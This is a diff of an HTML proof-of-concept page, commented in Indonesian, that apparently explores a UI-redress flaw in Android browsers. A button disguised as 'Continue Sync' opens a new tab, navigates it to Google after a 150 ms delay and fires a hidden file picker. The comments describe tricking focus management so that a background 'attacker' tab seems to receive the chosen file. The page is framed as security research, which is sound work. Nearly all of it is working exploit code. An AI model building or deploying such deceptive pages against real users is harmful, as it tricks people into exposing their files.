@@ -3,44 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Penelitian Keamanan UI - File Picker</title>
+    <title>Security Research - UI Redress</title>
     <style>
-        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #f0f2f5; }
-        #overlay {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            display: flex; align-items: center; justify-content: center;
-            cursor: pointer; z-index: 9999;
-        }
-        .btn { padding: 20px 40px; background: #1a73e8; color: white; border-radius: 8px; font-weight: bold; font-size: 1.2rem; }
+        body { margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; background: #202124; color: white; font-family: sans-serif; }
+        #trigger { padding: 25px 50px; background: #8ab4f8; color: black; border-radius: 30px; font-weight: bold; cursor: pointer; border: none; font-size: 1.1rem; }
         #fileInput { display: none; }
     </style>
 </head>
 <body>
 
     <input type="file" id="fileInput">
-
-    <div id="overlay">
-        <div class="btn">Lanjutkan ke Google</div>
-    </div>
+    <button id="trigger">Lanjutkan Sinkronisasi</button>
 
     <script>
-        const overlay = document.getElementById('overlay');
+        const trigger = document.getElementById('trigger');
         const fileInput = document.getElementById('fileInput');
 
-        overlay.addEventListener('click', () => {
-            // STRATEGI: Pemicuan Simultan sesuai permintaan
-            
-            // 1. Picu File Picker terlebih dahulu
-            fileInput.click();
+        trigger.addEventListener('click', () => {
+            // 1. Inisialisasi navigasi ke tab baru
+            // Kita simpan referensi window untuk "mengelabui" manajemen fokus
+            const newTab = window.open('about:blank', '_blank');
 
-            // 2. Langsung buka tab baru di baris berikutnya
-            window.open('https://www.google.com', '_blank');
+            // 2. Gunakan micro-delay untuk menyisipkan dialog
+            // Tujuannya agar dialog terpanggil SAAT tab baru sedang 'request focus'
+            setTimeout(() => {
+                // Navigasikan tab baru ke target asli (Google)
+                if (newTab) {
+                    newTab.location.href = 'https://www.google.com';
+                }
+
+                // Tepat setelah instruksi navigasi, tembak dialog file picker
+                // Ini mencoba memanfaatkan celah saat browser sedang sibuk memproses navigasi
+                fileInput.click();
+                
+            }, 150); // Delay 150ms adalah celah kritis pada transisi UI Android
         });
 
-        // Logika tambahan untuk mendeteksi apakah file berhasil terambil oleh tab "jahat"
         fileInput.onchange = (e) => {
             if (e.target.files.length > 0) {
-                alert('File berhasil diakses oleh tab latar belakang: ' + e.target.files.name);
+                console.log('POC Berhasil: File diakses oleh tab latar belakang.');
+                alert('Peringatan: File "' + e.target.files.name + '" berhasil dikirim ke tab penyerang!');
             }
         };
     </script>
